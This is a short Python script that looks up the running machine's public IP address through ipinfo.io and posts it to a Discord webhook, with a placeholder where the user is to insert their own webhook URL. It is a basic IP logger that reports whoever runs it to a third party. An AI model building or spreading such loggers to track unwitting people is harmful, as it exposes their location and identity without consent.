import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

def main():
    ip = requests.get('http://ipinfo.io/json').json()['ip']
    log("ip has been logged!", f"logged ip: {ip}")

def log(title, discription):
    webhook = DiscordWebhook(url=" !DELETE THIS AND INPUT UR WEBHOOK URL HERE! ")
    embed = DiscordEmbed(title=title, description=discription, color="0000FF")




    webhook.add_embed(embed)
    response = webhook.execute()

if __name__ == "__main__":
    main()
